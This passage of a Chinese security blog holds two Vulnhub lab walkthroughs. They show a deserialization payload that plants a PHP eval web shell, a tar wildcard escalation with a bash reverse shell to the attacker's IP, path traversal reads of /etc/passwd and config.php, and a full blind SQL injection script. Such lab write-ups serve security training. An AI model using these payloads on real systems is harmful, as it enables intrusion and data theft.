class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT -sV -sC -O -p22,80,111 192.168.31.63</span><br><span class="line">nmap.exe --script=vuln -p22,80,111 192.168.31.63</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213143115920.png" alt="image-20240213143115920"></p><p>22端口的ssh采用SSH-2协议的6.7p1版本，位于Debian 5操作系统上。80端口采用apache的http服务，标题是一个401未经许可的字样。111端口的是一个 RPC （远程过程调用）端口映射程序。</p><p><img src="/img/Vulnhub-pipe/image-20240213145533030.png" alt="image-20240213145533030"></p><p>似乎存CVE-2007-6750 漏洞</p><h3 id="3、web目录扫描"><a href="#3、web目录扫描" class="headerlink" title="3、web目录扫描"></a>3、web目录扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.cmd -u http://192.168.31.63 -x 404,403</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213150031411.png" alt="image-20240213150031411"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.31.63 -X .php,.html,.txt,.zip,.tar,.rar,.sql</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213152016401.png" alt="image-20240213152016401"></p><p>响应都是401</p><h3 id="4、web框架识别"><a href="#4、web框架识别" class="headerlink" title="4、web框架识别"></a>4、web框架识别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.31.63</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213150012747.png" alt="image-20240213150012747"></p><h1 id="三、获取shell立足点"><a href="#三、获取shell立足点" class="headerlink" title="三、获取shell立足点"></a>三、获取shell立足点</h1><h3 id="1、敏感信息收集"><a href="#1、敏感信息收集" class="headerlink" title="1、敏感信息收集"></a>1、敏感信息收集</h3><p>1、这个网站访问就需要登录凭证</p><p><img src="/img/Vulnhub-pipe/image-20240213152125418.png" alt="image-20240213152125418"></p><p>2、pipe.jpg文件</p><p>查看images 目录</p><p><img src="/img/Vulnhub-pipe/image-20240213150126935.png" alt="image-20240213150126935"></p><p>将该文件下载下来，使用exiftool工具对图片分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.31.63/images/pipe.jpg</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213152321299.png" alt="image-20240213152321299"></p><p>并没有什么发现</p><h3 id="2、尝试登录"><a href="#2、尝试登录" class="headerlink" title="2、尝试登录"></a>2、尝试登录</h3><p>采用bp抓包查看</p><p><img src="/img/Vulnhub-pipe/image-20240213153158975.png" alt="image-20240213153158975"></p><p>错误信息给出提供的账号或密码错误，另外说了一段您的浏览器不知道如何提供凭据</p><p>我们采用POST方式重新放包</p><p><img src="/img/Vulnhub-pipe/image-20240213154344785.png" alt="image-20240213154344785"></p><p>成功进来如下页面：</p><p><img src="/img/Vulnhub-pipe/image-20240213154359939.png" alt="image-20240213154359939"></p><p>下方有一个链接，在点击之后发生了请求</p><p><img src="/img/Vulnhub-pipe/image-20240213155219397.png" alt="image-20240213155219397"></p><p>抓包查看，疑似是一个反序列化的URL编码</p><p><img src="/img/Vulnhub-pipe/image-20240213155327124.png" alt="image-20240213155327124"></p><p>同时这里暴漏出来一个路径</p><p><img src="/img/Vulnhub-pipe/image-20240213163740984.png" alt="image-20240213163740984"></p><p>发现新的文件</p><p><img src="/img/Vulnhub-pipe/image-20240213163815755.png" alt="image-20240213163815755"></p><p>居然是一个php 的class类，可以进行日志文件的写入，我们正好配合反序列化漏洞来使用</p><h3 id="3、获取shell立足点"><a href="#3、获取shell立足点" class="headerlink" title="3、获取shell立足点"></a>3、获取shell立足点</h3><p>经过尝试，根目录下的文件我们都需要登录凭证，我们将日志文件写在<code>/var/www/html/images/shell.php</code> 文件，内容为<code>&lt;?php eval($_POST[1]);?&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;Log&quot;:2:&#123;s:8:&quot;filename&quot;;s:30:&quot;/var/www/html/images/shell.php&quot;;s:4:&quot;data&quot;;s:24:&quot;&lt;?php eval($_POST[1]);?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213162736989.png" alt="image-20240213162736989"></p><p>为了方便，我们直接用蚁剑进行连接</p><p><img src="/img/Vulnhub-pipe/image-20240213162502123.png" alt="image-20240213162502123"></p><h1 id="四、提权至root"><a href="#四、提权至root" class="headerlink" title="四、提权至root"></a>四、提权至root</h1><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p>1、&#x2F;etc&#x2F;passwd文件：存在rene 用户</p><p>2、&#x2F;home&#x2F;rene目录：存在777 的文件夹</p><p><img src="/img/Vulnhub-pipe/image-20240213165005507.png" alt="image-20240213165005507"></p><p><img src="/img/Vulnhub-pipe/image-20240213165123742.png" alt="image-20240213165123742"></p><p>是一个.gz 文件疑似备份文件，我们通过http 下载到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l #查看当前用户能使用的命令</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213165233274.png" alt="image-20240213165233274"></p><p>我们可以开启一个python2 的http服务，下载解压到指定目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8080</span><br><span class="line">wget http://192.168.31.63:8080/backup.tar.gz</span><br><span class="line">tar -xvf backup.tar.gz</span><br><span class="line">tar zxvf backup.tar.gz -C backup#backup目录要存在</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213165555292.png" alt="image-20240213165555292"></p><p><img src="/img/Vulnhub-pipe/image-20240213165951153.png" alt="image-20240213165951153"></p><p>上网查了一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sys-19858.BAK: 可能是一个 OpenPGP 密钥的备份文件。</span><br><span class="line">OpenPGP（开放式PGP）是一种标准，用于加密和签名电子通信数据，以确保数据的机密性和完整性。PGP 代表“Pretty Good Privacy”（相当不错的隐私），是由 Phil Zimmermann 开发的一种加密软件。我们需要知道文件类型、加密方式，利用方式较难</span><br><span class="line">sys-28346.BAK: 可能是 Dyalog APL 版本 43.-79 的备份文件</span><br><span class="line">如果是 Dyalog APL 用户，可以还原到备份版本的环境，但我们并不是该用户，无法利用</span><br></pre></td></tr></table></figure><p>3、&#x2F;etc&#x2F;crontab：计划任务</p><p><img src="/img/Vulnhub-pipe/image-20240213173425533.png" alt="image-20240213173425533"></p><p>会以root 权限执行两个.sh 脚本</p><p><img src="/img/Vulnhub-pipe/image-20240213173454605.png" alt="image-20240213173454605"></p><p>我们只能查看其中的<code>/usr/bin/compress.sh</code> 文件，tar 将<code>/home/rene/bachup</code>目录下的文件删除并又通过tar 命令进行了压缩</p><p>我们可以使用通配符进行提权</p><h3 id="2、tar通配符提权"><a href="#2、tar通配符提权" class="headerlink" title="2、tar通配符提权"></a>2、tar通配符提权</h3><p>进入<code>/home/rene/backup</code>目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&quot; &gt; /home/rene/backup/--checkpoint=1</span><br><span class="line">echo &quot;&quot; &gt; /home/rene/backup/--checkpoint-action=exec=&#x27;bash shell.sh&#x27;</span><br><span class="line">echo &quot;bash -i &gt;&amp;/dev/tcp/192.168.31.50/5555 0&gt;&amp;1&quot; &gt; /home/rene/backup/shell.sh</span><br><span class="line">#这里最后一条在蚁剑中执行失败，我们可以切换到nc上执行</span><br></pre></td></tr></table></figure><p>并在本地进行nc 监听5555端口</p><p><img src="/img/Vulnhub-pipe/image-20240213181814188.png" alt="image-20240213181814188"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Vulnhub系列】Vulnhub靶场_Seattle_003</title>
      <link href="/2024/02/17/Vulnhub-Seattle-003/"/>
      <url>/2024/02/17/Vulnhub-Seattle-003/</url>
      
        <content type="html"><![CDATA[<h1 id="【Vulnhub系列靶场】Vulnhub-Seattle-003靶场渗透"><a href="#【Vulnhub系列靶场】Vulnhub-Seattle-003靶场渗透" class="headerlink" title="【Vulnhub系列靶场】Vulnhub_Seattle_003靶场渗透"></a>【Vulnhub系列靶场】Vulnhub_Seattle_003靶场渗透</h1><h1 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h1><p>1、从百度网盘下载对应靶机的.ova镜像</p><p>2、在VM中选择【打开】该.ova</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210134843692.png" alt="image-20240210134843692"></p><p>3、选择存储路径，并打开</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210134856511.png" alt="image-20240210134856511"></p><p>4、之后确认网络连接模式是否为【NAT】</p><h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h3 id="1、主机发现"><a href="#1、主机发现" class="headerlink" title="1、主机发现"></a>1、主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sn 192.168.31.*</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Seattle-003/image-20240210103254625.png" alt="image-20240210103254625"></p><h3 id="2、端口探测"><a href="#2、端口探测" class="headerlink" title="2、端口探测"></a>2、端口探测</h3><p>1、快速粗略的扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.59</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Seattle-003/image-20240210103434464.png" alt="image-20240210103434464"></p><p>2、全端口精细扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT --min-rate 10000 -p- 192.168.31.59</span><br><span class="line">nmap.exe -sU --min-rate 10000 -p- 192.168.31.59</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Seattle-003/image-20240210104357998.png" alt="image-20240210104357998"></p><p><img src="/img/Vulnhub-Seattle-003/image-20240210103651560.png" alt="image-20240210103651560"></p><p>确认只开放了80端口</p><p>3、全扫描和漏洞扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT -sV -sC -O -p80 192.168.31.59</span><br><span class="line">nmap.exe -sT -sV -sC -O -p80 192.168.31.59</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Seattle-003/image-20240210104536620.png" alt="image-20240210104536620"></p><p>确认是Linux的Fedora 系统，是由 Red Hat 公司赞助和领导</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210104717424.png" alt="image-20240210104717424"></p><p>漏洞脚本探测出来存在csrf 和sql注入漏洞，很显然，这个SQL注入漏洞是一个关键点</p><h3 id="3、web目录探测"><a href="#3、web目录探测" class="headerlink" title="3、web目录探测"></a>3、web目录探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.cmd -u http://192.168.31.59 -x 404,403</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Seattle-003/image-20240210104043275.png" alt="image-20240210104043275"></p><p>针对zip等敏感文件进行扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.31.59 -X .php,.zip,.txt,.tar,.rar</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Seattle-003/image-20240210105150253.png" alt="image-20240210105150253"></p><h3 id="4、web框架探测"><a href="#4、web框架探测" class="headerlink" title="4、web框架探测"></a>4、web框架探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.31.59</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Seattle-003/image-20240210105210851.png" alt="image-20240210105210851"></p><h1 id="三、获取shell立足点"><a href="#三、获取shell立足点" class="headerlink" title="三、获取shell立足点"></a>三、获取shell立足点</h1><h3 id="1、查看敏感文件"><a href="#1、查看敏感文件" class="headerlink" title="1、查看敏感文件"></a>1、查看敏感文件</h3><p>1、在downloads目录下发现.pdf文件</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210105554332.png" alt="image-20240210105554332"></p><p><img src="/img/Vulnhub-Seattle-003/image-20240210105619577.png" alt="image-20240210105619577"></p><p>是一个对网站此时状态的一个描述，表示现在的网站有很多漏洞，诸如SQL漏洞、XSS、用户名泄露以及任意文件下载漏洞</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210105728931.png" alt="image-20240210105728931"></p><p><img src="/img/Vulnhub-Seattle-003/image-20240210105742640.png" alt="image-20240210105742640"></p><p><img src="/img/Vulnhub-Seattle-003/image-20240210105806973.png" alt="image-20240210105806973"></p><p><img src="/img/Vulnhub-Seattle-003/image-20240210105954501.png" alt="image-20240210105954501"></p><h3 id="2、任意文件下载漏洞"><a href="#2、任意文件下载漏洞" class="headerlink" title="2、任意文件下载漏洞"></a>2、任意文件下载漏洞</h3><p>通过任意文件下载漏洞尝试下载&#x2F;etc&#x2F;passwwd 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.59/download.php?item=../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Seattle-003/image-20240210110317205.png" alt="image-20240210110317205"></p><p>只存在root用户</p><p>下载config.php文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.59/download.php?item=../config.php</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Seattle-003/image-20240210114250835.png" alt="image-20240210114250835"></p><p>拿到数据库的账号密码：root:Alexis*94</p><h3 id="3、SQL注入漏洞"><a href="#3、SQL注入漏洞" class="headerlink" title="3、SQL注入漏洞"></a>3、SQL注入漏洞</h3><p>我们对<code>http://192.168.31.59/details.php?type=2&amp;prod=5</code>路径进行爆破，可以看到是一个布尔类型的SQL注入，我们修进我们的SQL_Boole 脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 存在GET类型的SQL注入的URL链接和参数</span><br><span class="line">url = &#x27;http://192.168.31.59/details.php?type=2&amp;prod=5&#x27;</span><br><span class="line"></span><br><span class="line">def column_data_name(column_data_len,User_table_name,User_column_name):</span><br><span class="line">    column_data_names = &#123;&#125;</span><br><span class="line">    column_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(column_data_len)):         #i是第几个字段的值</span><br><span class="line">        for j in range(1,column_data_len[i]+1):     #j是要爆破字段值的第几个字符</span><br><span class="line">            for n in range(0,126):                  #n是要爆破字段值的ascii码值</span><br><span class="line">                new_url = url + &quot;%20and%20ascii(substr((select &quot; + User_column_name + &quot; from &quot; + User_table_name + &quot; limit &quot;+ str(i) +&quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(n)</span><br><span class="line">                if Response_judgment(new_url):</span><br><span class="line">                    column_one_name += chr(n)</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;&#123;User_column_name&#125;字段的第&#123;i&#125;个值为：&#123;column_one_name&#125;&quot;)</span><br><span class="line">        column_data_names[i] = column_one_name</span><br><span class="line">        column_one_name = &#x27;&#x27;</span><br><span class="line">    return column_data_names</span><br><span class="line"></span><br><span class="line">def column_data_length(column_names,User_table_name,User_column_name):</span><br><span class="line">    column_data_len = &#123;&#125;</span><br><span class="line">    for i in range(0,10):           #i是第几个字段的值，猜测10个数值</span><br><span class="line">        for j in range(1,20):       #j是要爆破字段数值的长度，猜测该字段数值最大为20</span><br><span class="line">            new_url = url + &quot;%20and%20length((select &quot;+ User_column_name +&quot; from &quot;+ User_table_name +&quot; limit &quot;+ str(i) +&quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(new_url):</span><br><span class="line">                column_data_len[i] = j</span><br><span class="line">                if i == 10:</span><br><span class="line">                    print(&#x27;已超过测试数值的最大值，请调整！！！&#x27;)</span><br><span class="line">                break</span><br><span class="line">    return column_data_len</span><br><span class="line"></span><br><span class="line">def column_name(column_len,User_table_name):</span><br><span class="line">    column_names = &#123;&#125;</span><br><span class="line">    column_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(column_len)):          #i是第几个字段，len(column_len) 是字段的数量</span><br><span class="line">        for j in range(1,column_len[i]+1):      #j是要爆破字段的第几个字符</span><br><span class="line">            for n in range(0,126):              #n是要爆破字段名的ascii码值</span><br><span class="line">                new_url = url + &quot;%20and%20ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot; + hex(int.from_bytes(User_table_name.encode(),&#x27;big&#x27;)) + &quot; limit &quot;+ str(i) +&quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(n)</span><br><span class="line">                if Response_judgment(new_url):</span><br><span class="line">                    column_one_name += chr(n)</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;&#123;User_table_name&#125;表的第&#123;i&#125;个字段的名称为：&#123;column_one_name&#125;&quot;)</span><br><span class="line">        column_names[i] = column_one_name</span><br><span class="line">        column_one_name = &#x27;&#x27;</span><br><span class="line">    return column_names</span><br><span class="line"></span><br><span class="line">def column_length(User_table_name):     #要查看的表名</span><br><span class="line">    column_len = &#123;&#125;</span><br><span class="line">    for i in range(0,10):               #i是第几个字段，这里假设有10个字段</span><br><span class="line">        for j in range(1,30):           #j是要爆破字段的长度，假设字段长度最长为20</span><br><span class="line">            new_url = url + &quot;%20and%20length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;+ hex(int.from_bytes(User_table_name.encode(), &#x27;big&#x27;)) +&quot; limit &quot;+ str(i) +&quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(new_url):</span><br><span class="line">                column_len[i] = j</span><br><span class="line">                if i == 10:</span><br><span class="line">                    print(&#x27;已超过测试字段数的最大值，请调整！！！&#x27;)</span><br><span class="line">                break</span><br><span class="line">    return column_len</span><br><span class="line"></span><br><span class="line">def table_name(table_len):</span><br><span class="line">    table_names = &#123;&#125;</span><br><span class="line">    table_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(table_len)):       #i是第几张表，len(table_len)表示共有几张表</span><br><span class="line">        for j in range(1,table_len[i]+1):   #j是要爆破表名第几个字符，到表的长度</span><br><span class="line">            for n in range(0,126):          #n是要爆破表名的ascii码值</span><br><span class="line">                new_url = url + &quot;%20and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot; + str(i) + &quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(n)</span><br><span class="line">                if Response_judgment(new_url):</span><br><span class="line">                    table_one_name += chr(n)</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;第&#123;i&#125;张表的名称为：&#123;table_one_name&#125;&quot;)</span><br><span class="line">        table_names[i] = table_one_name</span><br><span class="line">        table_one_name = &#x27;&#x27;</span><br><span class="line">    return table_names</span><br><span class="line"></span><br><span class="line">def table_length():</span><br><span class="line">    table_len = &#123;&#125;</span><br><span class="line">    for i in range(0,10):           #i是第几张表</span><br><span class="line">        for j in range(1,10):       #j是要爆破表的长度</span><br><span class="line">            new_url = url + &quot;%20and%20length((select table_name from information_schema.tables where table_schema=database() limit &quot; + str(i) + &quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(new_url):</span><br><span class="line">                table_len[i] = j</span><br><span class="line">                break</span><br><span class="line">    return table_len</span><br><span class="line"></span><br><span class="line">def database_name(database_len):</span><br><span class="line">    database_names = &#x27;&#x27;</span><br><span class="line">    for i in range(1,database_len + 1):     #i是数据库的第几个字符</span><br><span class="line">        for j in range(0,126):              #j是要爆破数据库名的ascii码值</span><br><span class="line">            new_url = url + &quot;%20and%20ascii(substr(database(),&quot; + str(i) + &quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(new_url):</span><br><span class="line">                database_names += chr(j)</span><br><span class="line">                break</span><br><span class="line">    return database_names</span><br><span class="line"></span><br><span class="line">def database_length():</span><br><span class="line">    new_url = &#x27;&#x27;</span><br><span class="line">    for i in range(1,10):       #假设数据库的长度在10以内</span><br><span class="line">        new_url = url + &quot;%20and%20length(database())=&quot; + str(i)</span><br><span class="line">        if Response_judgment(new_url):</span><br><span class="line">            return i</span><br><span class="line">    print(&#x27;payload无效，请更替payload或增加爆破的数据库名长度！！！&#x27;)</span><br><span class="line">    print(new_url)</span><br><span class="line"></span><br><span class="line">def Response_judgment(new_url):</span><br><span class="line">    cookies = &#123;</span><br><span class="line">        &#x27;level&#x27; : &#x27;1&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    respone = requests.get(new_url, cookies=cookies)</span><br><span class="line">    if &quot;T-Shirt&quot; in respone.text:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    database_names = database_name(database_length())   #这里传入数据库的长度</span><br><span class="line">    print(f&quot;当前数据库的名称为：&#123;database_names&#125;&quot;)</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    table_names = table_name(table_length())            #求表的名称，传入表的长度</span><br><span class="line">    while True:                 #这里做无限循环，以方便循环查询所有的表</span><br><span class="line">        print(&#x27;-----------------------------&#x27;)</span><br><span class="line">        print(f&quot;所有表的名称为：&#123;table_names&#125;&quot;)</span><br><span class="line">        User_table_name = input(&#x27;请输入要查看的表名（exit退出）：&#x27;)</span><br><span class="line">        if User_table_name == &#x27;exit&#x27;:</span><br><span class="line">            break</span><br><span class="line">        print(&#x27;-----------------------------&#x27;)</span><br><span class="line">        column_names = column_name(column_length(User_table_name),User_table_name)       #求字段的名字，输入字段的长度</span><br><span class="line">        while True:             #这里做无限循环，方便查询表的所有字段值</span><br><span class="line">            print(&#x27;-----------------------------&#x27;)</span><br><span class="line">            print(f&quot;该表中所有字段的名称为：&#123;column_names&#125;&quot;)</span><br><span class="line">            User_column_name = input(&#x27;请输入要查看的字段名（exit退出）：&#x27;)</span><br><span class="line">            if User_column_name == &#x27;exit&#x27;:</span><br><span class="line">                break</span><br><span class="line">            print(&#x27;-----------------------------&#x27;)</span><br><span class="line">            column_data_len = column_data_length(column_names,User_table_name,User_column_name)   #求字段值的长度，传入字段的名称</span><br><span class="line">            column_data_names = column_data_name(column_data_len,User_table_name,User_column_name)  #求字段的值</span><br><span class="line">            print(&#x27;-----------------------------&#x27;)</span><br><span class="line">            print(f&quot;&#123;User_column_name&#125;字段中所有数值为：&#123;column_data_names&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    print(&quot;Bye！程序已退出！！！&quot;)</span><br></pre></td></tr></table></figure><p>在判断函数中加入cookie以及修改判断条件即可</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210123233979.png" alt="image-20240210123233979"></p><p><img src="/img/Vulnhub-Seattle-003/image-20240210123406099.png" alt="image-20240210123406099"></p><p>这里并没有我们想要的数据，也许是脚本有些地方考虑不周到，但是对脚本的应用是一次不错的提升</p><h3 id="4、登录后台"><a href="#4、登录后台" class="headerlink" title="4、登录后台"></a>4、登录后台</h3><p>通过任意文件下载漏洞，下载login.php文件进行分析</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210123540577.png" alt="image-20240210123540577"></p><p>先判断了用户的邮箱，再判断密码是否正确</p><p>正好在blog.php?author&#x3D;1的页面中爆破了用户邮箱的敏感信息，那么根据源代码分析此处可以造成SQL漏洞</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210123636194.png" alt="image-20240210123636194"></p><p>我们拿到用户邮箱，回到登录页面，这里我们直接用sqlmap 进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.cmd -u http://192.168.31.59/login.php --data &quot;usermail=admin@seattlesounds.net&amp;password=111*&quot; --cookie &quot;level=1&quot; --batch -D seattle --tables</span><br></pre></td></tr></table></figure><p>在爆破过程中发现该数据库有三张表</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210125137460.png" alt="image-20240210125137460"></p><p>而SQL_Boole 脚本未爆破出来其他两张表的原因是，我们假设表的最大长度为10</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210125347335.png" alt="image-20240210125347335"></p><p>当我们修改成20之后，SQL_Boole 脚本可以正常使用，且爆破速度比SQLMap 还要快上很多</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210125903261.png" alt="image-20240210125903261"></p><p>这里username 无数据，可能也是长度限制的问题，但是好在密码的长度较短，可以爆破出来</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210130050742.png" alt="image-20240210130050742"></p><p>也可以爆破出来其他字段，不过在改靶机中我们只拿到密码即可</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210130209765.png" alt="image-20240210130209765"></p><p>后台登录成功</p><h3 id="5、获取shell立足点"><a href="#5、获取shell立足点" class="headerlink" title="5、获取shell立足点"></a>5、获取shell立足点</h3><p>在后台可以提交博客内容，但是无getshell 的方法，此靶机只有web漏洞，不能getshell</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
